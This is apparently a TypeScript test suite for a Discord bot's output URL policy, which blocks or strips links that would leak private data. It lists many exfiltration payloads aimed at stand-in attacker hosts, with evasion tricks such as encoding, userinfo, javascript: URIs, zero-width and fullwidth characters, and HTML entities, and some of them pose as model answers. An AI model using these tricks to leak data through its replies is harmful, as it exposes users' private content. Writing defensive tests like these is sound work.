import {test} from 'node:test';
import assert from 'node:assert/strict';
import {assertPrivateOutputURLs,sanitizePrivateOutputURLs} from '../src/service/output-url-policy.js';
import {UserError} from '../src/service/types.js';

const trusted='https://example.org/source';
const message='https://discord.com/channels/123456789012345678/223456789012345678/323456789012345678';
const secret='PRIVATE_OUTPUT_SENTINEL';
const allowed=new Set([trusted,message,'https://example.org/wiki/topic_(math)','https://example.org/source?q=public%20value']);
const permits=(url:string)=>allowed.has(url);
const rejects=(text:string)=>assert.throws(()=>assertPrivateOutputURLs(text,permits),(error:unknown)=>{
  assert.ok(error instanceof UserError);assert.ok(!error.message.includes(secret));assert.ok(!error.message.includes('attacker'));return true;
});

test('private output keeps exact authorized public and host-built Discord links',()=>{
  assertPrivateOutputURLs(`see [source](<${trusted}>) and [message](<${message}>).`,permits);
});
test('canonical case/default port and balanced punctuation preserve authorized targets',()=>{
  assertPrivateOutputURLs('see https://EXAMPLE.org:443/source, and [math](https://example.org/wiki/topic_(math)).',permits);
});
test('ordinary private prose, dotted math code and channel mentions remain usable',()=>{
  assertPrivateOutputURLs('you said the result is 5 in <#223456789012345678>.\n```python\ny = math.sin(x)\n```',permits);
  assertPrivateOutputURLs('use math.sin',permits);
});
test('authorized encoded query is exact and not decoded into a different target',()=>{
  assertPrivateOutputURLs('https://example.org/source?q=public%20value',permits);
  assertPrivateOutputURLs('[source](https://example.org/source?q=public%20value).',permits);
});
for(const [name,text] of Object.entries({
  bare:`https://attacker.invalid/?q=${secret}`,
  markdown:`[source](https://attacker.invalid/?q=${secret})`,
  autolink:`<https://attacker.invalid/#${secret}>`,
  encodedQuery:`${trusted}?q=${encodeURIComponent(secret)}`,
  encodedFragment:`${trusted}#${encodeURIComponent(secret)}`,
  encodedParameter:`${trusted}?%71=${secret}`,
  userinfo:`https://example.org@attacker.invalid/?q=${secret}`,
  userinfoAllowedHost:`https://${secret}@example.org/source`,
  alternativeScheme:`ftp://attacker.invalid/${secret}`,
  customScheme:`custom://attacker.invalid/${secret}`,
  mailto:`[send](mailto:${secret}@attacker.invalid)`,
  data:`[link](data:text/plain,${secret})`,
  javascript:`[link](javascript:open('https://attacker.invalid/${secret}'))`,
  protocolRelative:`[link](//attacker.invalid/${secret})`,
  schemeless:`attacker.invalid/${secret}`,
  schemelessIPv4:`203.0.113.42/?q=${secret}`,
  schemelessIPv6:`[2001:db8::42]/?q=${secret}`,
  bareCommonDomain:`${secret}.attacker.invalid`,
  bareUncommonDomain:'sensitive-marker.attacker.museum',
  bareOneDotUncommonDomain:'attacker.museum',
  bareOneDotPrivateDomain:'sensitive-marker.museum',
  safeCodePath:'math.sin/sensitive-marker',
  safeCodeQuery:'math.sin?q=sensitive-marker',
  safeCodeFragment:'math.sin#sensitive-marker',
  safeCodeSuffix:'math.sin.sensitive-marker',
  safeCodeMarkdown:'[link](math.sin)',
  safeCodeAutolink:'<math.sin>',
  safeCodeHiddenPath:'math.sin\u200b/sensitive-marker',
  bareIDNDomain:'sensitive-marker.\u0430ttacker.museum',
  bareIDNADots:'sensitive-marker\u3002attacker\u3002museum',
  bareHalfwidthDots:'sensitive-marker\uff61attacker\uff61museum',
  bareIPv4:'203.0.113.42',
  bareIPv6:'[2001:db8::42]',
  adjacentMarkdownURL:`[source](${trusted})https://attacker.invalid/?q=${secret}`,
  adjacentMarkdownDomain:`[source](${trusted})sensitive-marker.attacker.museum`,
  adjacentBalancedMarkdown:`[math](https://example.org/wiki/topic_(math))https://attacker.invalid/${secret}`,
  bareMarkdownDomain:'[link](attacker.museum)',
  email:`${secret}@attacker.museum`,
  code:`\`\`\`text\nhttps://attacker.invalid/${secret}\n\`\`\``,
  multiple:`${trusted} and https://attacker.invalid/${secret}`,
  backslash:`https:\\attacker.invalid\\${secret}`,
  hiddenScheme:`https:\u200b//attacker.invalid/${secret}`,
  markdownEscape:`[link](https\\://attacker.invalid/${secret})`,
  numericEntity:`https&#58;//attacker.invalid/${secret}`,
  namedEntity:`https&colon;&sol;&sol;attacker.invalid/${secret}`,
  encodedWhole:encodeURIComponent(`https://attacker.invalid/${secret}`),
  doubleEncoded:encodeURIComponent(encodeURIComponent(`https://attacker.invalid/${secret}`)),
  fullwidth:`ｈｔｔｐｓ：／／attacker.invalid/${secret}`,
}))test(`private output denies ${name} without echoing sensitive content`,()=>rejects(text));

test('query/fragment punctuation cannot be stripped to gain authorization',()=>{
  const auth=(url:string)=>url==='https://example.org/source?q='||url==='https://example.org/source#';
  assert.throws(()=>assertPrivateOutputURLs('https://example.org/source?q=.',auth),UserError);
  assert.throws(()=>assertPrivateOutputURLs('https://example.org/source#;',auth),UserError);
  for(const ending of [')',']','}']){
    assert.throws(()=>assertPrivateOutputURLs('https://example.org/source?q='+ending,auth),UserError);
    assert.throws(()=>assertPrivateOutputURLs('https://example.org/source#'+ending,auth),UserError);
  }
});
test('host ledger failure does not reveal URL or private data',()=>{
  assert.throws(()=>assertPrivateOutputURLs(trusted,()=>{throw new Error(secret);}),error=>error instanceof UserError&&!error.message.includes(secret));
});
test('private output sanitizer removes direct unauthorized addresses and keeps authorized targets',()=>{
  const input=`keep ${trusted}; drop https://attacker.invalid/${secret}; email ${secret}@attacker.museum`;
  const sanitized=sanitizePrivateOutputURLs(input,permits);assert.ok(sanitized.includes(trusted));assert.ok(!sanitized.includes('attacker.invalid'));assert.ok(!sanitized.includes('@attacker.museum'));assert.match(sanitized,/\[external address omitted\]/);assertPrivateOutputURLs(sanitized,permits);assert.equal(sanitizePrivateOutputURLs(sanitized,permits),sanitized);
});
test('sanitizer leaves ambiguous encoded egress for the unchanged assertion to block',()=>{const encoded=encodeURIComponent(`https://attacker.invalid/${secret}`);const sanitized=sanitizePrivateOutputURLs(encoded,permits);assert.throws(()=>assertPrivateOutputURLs(sanitized,permits),UserError);});

import {runner} from '../src/service/inference.js';
import {Store} from '../src/service/store.js';
import type {ServiceConfig} from '../src/service/config.js';
const cfg:ServiceConfig={mode:'development',secret:'fixture',port:8787,database:':memory:',concurrency:1,reserved:0,borrow:false,timeoutMs:10000,maxQueue:20,backend:'http://localhost:9999/v1',model:'p2-fixture',backendKey:'',vision:false,nativeTools:false,python:'unused',searchKey:'',sandbox:false,sandboxImage:'unused',cognitiveRouting:true};
const scope={guild:'123456789012345678',channel:'223456789012345678',user:'323456789012345678',coach:false,kind:'ask' as const};
async function privateReply(text:string){const s=new Store(':memory:');let network=0;try{const p=s.admit({...scope,id:'parent',prompt:'old server lookup'},10);s.running(p.id);s.complete(p.id,{answer:'private context',retrievalContext:JSON.stringify({kind:'discord',refs:[{id:'423456789012345678',channelId:scope.channel}]})});
 const j=s.admit({...scope,id:'next',parent:p.id,prompt:'hi'},10);const run=runner(cfg,s,{discord:async()=>({type:'DISCORD_AUDIENCE_DATA',allowed:true}),search:async()=>{network++;return [];},fetchText:async()=>{network++;throw new Error('unexpected');},complete:async()=>Response.json({choices:[{message:{content:JSON.stringify({answer:text})},finish_reason:'stop'}]})});
 try{return {result:await run(j,AbortSignal.timeout(10000),()=>{}),network};}catch(error){return {error,network};}
 }finally{s.close();}}
test('P2 real private-history final sanitizes direct URL egress without public network I/O',async()=>{
 const out=await privateReply('[read](https://attacker.invalid/?q='+secret+')');assert.equal(out.network,0);assert.ok(out.result);assert.ok(!out.result.answer.includes(secret));assert.ok(!out.result.answer.includes('attacker.invalid'));assert.match(out.result.answer,/\[external address omitted\]/);
});
test('P2 full private answer is sanitized beyond the Discord attachment cutoff',async()=>{
 const out=await privateReply('a'.repeat(2500)+' https://attacker.invalid/'+secret);assert.equal(out.network,0);assert.ok(out.result);assert.ok(out.result.answer.startsWith('a'.repeat(2500)));assert.ok(!out.result.answer.includes(secret));assert.ok(!out.result.answer.includes('attacker.invalid'));assert.match(out.result.answer,/\[external address omitted\]/);
});
test('P2 inherited host message link remains available, while invented URL additions are removed',async()=>{
 const link=`https://discord.com/channels/${scope.guild}/${scope.channel}/423456789012345678`;
 assert.equal((await privateReply('see '+link)).result?.answer,'see '+link);
 const tampered=await privateReply('see '+link+'?data='+secret);assert.ok(tampered.result);assert.ok(!tampered.result.answer.includes(secret));assert.ok(!tampered.result.answer.includes('?data='));assert.match(tampered.result.answer,/\[external address omitted\]/);
});
test('P2 ordinary public finals keep URLs and provenance fetch rules do not weaken',async()=>{
 const s=new Store(':memory:');try{const j=s.admit({...scope,id:'public',prompt:'hi'},10);const answer='https://example.org/public';const r=await runner(cfg,s,{complete:async()=>Response.json({choices:[{message:{content:JSON.stringify({answer})},finish_reason:'stop'}]})})(j,AbortSignal.timeout(10000),()=>{});assert.equal(r.answer,answer);assert.equal(r.provenance?.classification,'public');
 const {TurnWebBoundary}=await import('../src/service/turn-web-boundary.js');const b=new TurnWebBoundary(answer);b.observeDiscord({type:'DISCORD_SEARCH_DATA',results:[{channelId:scope.channel,content:'private'}]},scope.guild);assert.ok(b.permitsOutbound(answer));assert.equal(b.permits(answer),false);
 }finally{s.close();}
});
test('P2 deterministic verified Discord excerpts sanitize unauthorized URLs then re-verify',async()=>{
 const s=new Store(':memory:');try{const j=s.admit({...scope,id:'quote',prompt:'search this server for calculus'},10);let model=0;
 const result=await runner(cfg,s,{discord:async()=>({type:'DISCORD_SEARCH_DATA',results:[{id:'423456789012345678',channelId:scope.channel,author:{id:scope.user},content:'calculus: https://attacker.invalid/'+secret}]}),complete:async()=>{model++;throw new Error('must not generate');}})(j,AbortSignal.timeout(10000),()=>{});assert.equal(model,0);assert.ok(!result.answer.includes('attacker.invalid'));assert.ok(!result.answer.includes(secret));assert.match(result.answer,/\[external address omitted\]/);assert.match(result.answer,/https:\/\/discord\.com\/channels\//);
 }finally{s.close();}
});
